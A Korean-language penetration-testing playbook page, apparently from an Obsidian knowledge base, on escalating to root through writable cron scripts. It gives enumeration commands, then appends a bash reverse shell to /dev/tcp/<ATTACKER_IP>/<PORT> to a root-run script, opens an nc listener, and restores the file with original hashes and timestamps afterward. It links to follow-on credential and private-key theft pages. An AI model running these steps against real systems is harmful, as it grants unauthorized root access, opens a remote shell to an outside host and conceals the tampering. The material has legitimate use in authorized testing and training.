---
tags:
  - 환경/linux
시작조건: ["Linux shell", "고권한 cron 실행 경로 확인"]
필요권한: ["cron 호출 script 쓰기 권한"]
필요조건: ["Linux shell", "cron 실행 경로 확인"]
결과: ["명령 실행", "root shell"]
---

# Cron 권한 상승

## 한 줄 판단

현재 Linux 셸의 계정으로 root 또는 다른 고권한 계정이 주기적으로 실행하는 cron 스크립트나 그 상위 디렉터리에 쓸 수 있다면, 다음 실행 때 삽입한 명령이 그 고권한 계정으로 실행되는지 확인한다.

## 사용할 때

- `/etc/crontab`, `/etc/cron.d`, 사용자 crontab, 실행 script가 읽히거나 쓰일 때.
- cron이 호출하는 script나 directory가 현재 사용자에게 writable일 때.
- 실행 주기와 사용자 필드가 확인될 때.

## 전제 조건

| 조건 | 확인 방법 | 충족 기준 |
|---|---|---|
| cron 항목 | `cat /etc/crontab`, `ls /etc/cron.*` | 실행 사용자/명령 확인 |
| 쓰기 가능 경로 | `ls -la`, `find -writable` | script 또는 디렉터리 수정 가능 |
| 실행 확인 | timestamp/listener | 주기 실행 확인 |

## 실행
### cron 확인

```bash
cat /etc/crontab
ls -la /etc/cron.d /etc/cron.hourly /etc/cron.daily 2>/dev/null
find / -writable -type f 2>/dev/null | rg "cron|backup|script|sh"
```

확인할 출력:

- root로 실행되는 script와 현재 사용자 writable 여부.

### reverse shell 삽입 예시

원본을 보존하고 hash를 기록한다.

```bash
cp --preserve=mode,timestamps /path/to/writable-script.sh /tmp/writable-script.sh.bak
sha256sum /path/to/writable-script.sh /tmp/writable-script.sh.bak
echo 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"' >> /path/to/writable-script.sh
nc -lvnp <PORT>
```

확인할 출력:

- cron 실행 시 listener로 연결.
- 변경 직전 원본과 backup의 hash 일치.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| listener에 연결되고 `id`가 root로 표시됨 | root cron이 삽입한 명령을 실행함 | root shell | 원본 복원 후 [[고권한 세션 확보 후 후속 판단]] |
| 고유 proof 파일이 root 소유로 생성됨 | 고권한 cron 실행은 성공했으나 interactive shell은 없음 | root 명령 실행 | proof와 원본을 정리한 뒤 [[고권한 세션 확보 후 후속 판단]] |
| script timestamp와 로그가 바뀌지 않음 | 주기 또는 실제 호출 경로가 다름 | 기존 Linux shell 유지 | cron log와 정확한 실행 경로 재확인 |
| script 또는 상위 디렉터리에 쓸 수 없음 | 현재 사용자가 실행 내용을 바꿀 수 없음 | cron 단서만 확보 | 다른 writable script, PATH 또는 별도 권한 상승 기법 확인 |
| cron은 실행되지만 callback이 없음 | outbound 또는 listener 경로 문제 | 고권한 실행 가능성 미확정 | 식별 가능한 root 소유 테스트 파일 생성으로 분리 검증 |

## 확인할 출력과 권한

| 확인 지점 | 확인할 출력 | 권한 판단 |
|---|---|---|
| cron 소유자와 실행 사용자 | `/etc/crontab` 사용자 필드, 파일 소유권 | root 또는 다른 고권한 사용자의 작업인지 확인 |
| 쓰기 권한 | `ls -la`, 상위 디렉터리 권한 | script 내용과 경로 중 실제로 제어 가능한 지점 확인 |
| 실행 결과 | `id`, root 소유 파일, cron timestamp·log | callback 수신과 고권한 명령 실행을 분리해 확정 |

## 변경 영향과 복구

root 셸을 확보한 즉시 원본 내용을 복원하고 backup의 mode·timestamp를 적용한다.

```bash
cat /tmp/writable-script.sh.bak > /path/to/writable-script.sh
chmod --reference=/tmp/writable-script.sh.bak /path/to/writable-script.sh
touch --reference=/tmp/writable-script.sh.bak /path/to/writable-script.sh
sha256sum /path/to/writable-script.sh /tmp/writable-script.sh.bak
rm -f -- /tmp/writable-script.sh.bak /tmp/cron-proof-<UNIQUE_ID>
```

확인할 출력:

- 복원한 script와 backup의 hash가 일치한다.
- `stat /path/to/writable-script.sh`로 mode와 timestamp가 변경 전 기록과 일치한다.
- 검증용 listener와 reverse shell 프로세스를 종료한다.

ACL, 소유권 또는 xattr가 있는 파일은 변경 전에 `getfacl`, `stat`, `getfattr`를 기록하고 root 셸에서 그 값까지 복원한다. backup 경로와 고유 proof 이름은 현재 작업마다 다르게 사용한다.

## 후속 공격 연결

- [[Reverse Shell 획득]]
- [[Linux 파일 자격증명 검색]]
- [[Linux Shell History 자격증명 검색]]
- [[Linux 개인키 검색]]

## 관련 상태 라우터

- root 셸 또는 root 명령 실행 확인: [[고권한 세션 확보 후 후속 판단]]
- cron 후보만 남거나 일반 사용자 셸 유지: [[Linux 셸 확보 후 초기 열거와 권한 상승]]

## 관련 도구

- [[linpeas]]
